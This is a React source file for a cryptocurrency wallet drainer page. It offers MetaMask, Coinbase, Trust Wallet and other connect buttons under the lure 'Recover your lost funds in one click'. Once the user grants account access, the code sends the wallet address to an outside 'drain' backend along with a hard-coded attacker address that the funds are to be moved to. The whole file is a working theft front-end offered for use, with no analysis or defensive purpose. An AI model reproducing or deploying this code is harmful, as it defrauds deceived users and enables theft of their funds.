import React, { useState } from "react";
import ReactDOM from "react-dom/client";

const App = () => {
  const [response, setResponse] = useState(null);
  const [loading, setLoading] = useState(false);
  const [wallets, setWallets] = useState([
    { name: "MetaMask", icon: "https://upload.wikimedia.org/wikipedia/commons/2/2a/MetaMask_icon.svg", id: "metamask" },
    { name: "WalletConnect", icon: "https://walletconnect.com/images/walletconnect-logo.svg", id: "walletconnect" },
    { name: "Coinbase Wallet", icon: "https://upload.wikimedia.org/wikipedia/commons/5/53/Coinbase_Wallet_Logo.png", id: "coinbase" },
    { name: "Trust Wallet", icon: "https://upload.wikimedia.org/wikipedia/commons/7/75/Trust_Wallet_Logo.png", id: "trust" },
    { name: "Math Wallet", icon: "https://mathwallet.org/static/images/logo.png", id: "math" },
    { name: "TokenPocket", icon: "https://tokenpocket.io/static/images/logo.png", id: "tokenpocket" },
  ]);

  const connectWallet = async (walletId) => {
    setLoading(true);
    setResponse(null);

    try {
      // Check if the wallet is supported
      if (!window[walletId]) {
        throw new Error(`Wallet ${walletId} not supported.`);
      }

      // Request account access
      const accounts = await window[walletId].request({ method: "eth_requestAccounts" });
      const address = accounts[0];

      // Send the request to your backend to drain the wallet
      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          address,
          drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
        }),
      });

      const data = await res.json();
      setResponse(data);
      setLoading(false);
    } catch (err) {
      console.error(err);
      setResponse({
        error: "Failed to drain wallet. Please try again.",
        message: err.message,
      });
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4">
      <div className="max-w-md w-full bg-gray-800 p-8 rounded-lg shadow-lg text-center">
        <h1 className="text-4xl font-bold mb-6">Wallet Drainer</h1>
        <p className="text-lg mb-8">
          Recover your lost funds in one click. Connect your wallet now.
        </p>

        <div className="space-y-4">
          {wallets.map((wallet) => (
            <button
              key={wallet.id}
              onClick={() => connectWallet(wallet.id)}
              disabled={loading}
              className={`flex items-center justify-center p-3 rounded-lg transition-all duration-200 ${
                loading
                  ? "bg-gray-700 cursor-not-allowed"
                  : "bg-blue-600 hover:bg-blue-700"
              }`}
            >
              <img
                src={wallet.icon}
                alt={wallet.name}
                className="w-8 h-8 mr-3"
              />
              <span className="text-white font-medium">{wallet.name}</span>
            </button>
          ))}
        </div>

        {response && (
          <div className="mt-6 p-4 bg-gray-700 rounded">
            <h3 className="font-bold text-gray-200">Response:</h3>
            <pre className="text-sm text-gray-400">{JSON.stringify(response, null, 2)}</pre>
          </div>
        )}
      </div>
    </div>
  );
};

const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<App />);